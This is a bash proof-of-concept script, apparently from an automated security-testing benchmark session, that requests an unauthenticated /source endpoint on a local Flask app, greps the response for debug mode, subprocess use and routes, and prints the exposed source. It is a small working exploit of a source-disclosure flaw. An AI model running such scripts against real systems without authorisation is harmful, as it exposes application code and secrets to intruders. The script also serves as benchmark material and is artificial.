#!/bin/bash
# POC: POC to demonstrate Flask source code disclosure via /source endpoint. Verifies that the endpoint returns HTTP 200 and exposes complete Python source code including debug mode setting and subprocess usage patterns.
# Target: ./repo
# Created: 2025-11-10T15:09:31.337Z
# Session: benchmark-XBEN-042-24-mht9ytgy

# POC for Flask Source Code Disclosure via /source Endpoint
# This script demonstrates a CRITICAL vulnerability where the Flask application
# exposes its complete Python source code through an unauthenticated endpoint

TARGET_URL="http://localhost:8080/source"
RESPONSE_FILE="/tmp/source_disclosure_response.txt"

echo "[*] Testing Flask Source Code Disclosure Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Make the request to the /source endpoint
echo "[*] Sending GET request to /source endpoint..."
HTTP_CODE=$(curl -s -o "$RESPONSE_FILE" -w "%{http_code}" "$TARGET_URL")

echo "[*] HTTP Response Code: $HTTP_CODE"
echo ""

# Check if the response is successful (200)
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Endpoint returned HTTP 200 - Source code is accessible!"
    echo ""
    
    # Check for sensitive patterns in the response
    echo "[*] Checking for sensitive information in source code..."
    echo ""
    
    if grep -q "debug=True" "$RESPONSE_FILE"; then
        echo "[!] CRITICAL: Debug mode enabled (debug=True)"
    fi
    
    if grep -q "subprocess" "$RESPONSE_FILE"; then
        echo "[!] CRITICAL: Subprocess usage detected"
    fi
    
    if grep -q "app.route" "$RESPONSE_FILE"; then
        echo "[!] CRITICAL: Route handlers exposed"
    fi
    
    if grep -q "@app.route" "$RESPONSE_FILE"; then
        echo "[!] CRITICAL: Flask routes completely exposed"
    fi
    
    if grep -q "import" "$RESPONSE_FILE"; then
        echo "[!] CRITICAL: Import statements exposed"
    fi
    
    echo ""
    echo "[*] First 50 lines of exposed source code:"
    echo "=================================================="
    head -n 50 "$RESPONSE_FILE" | sed 's/&lt;/</g; s/&gt;/>/g; s/&amp;/\&/g'
    echo "=================================================="
    echo ""
    echo "[+] VULNERABILITY CONFIRMED: Complete application source code is publicly accessible!"
    
else
    echo "[-] FAILED: Endpoint did not return HTTP 200"
    echo "[-] Response code: $HTTP_CODE"
    exit 1
fi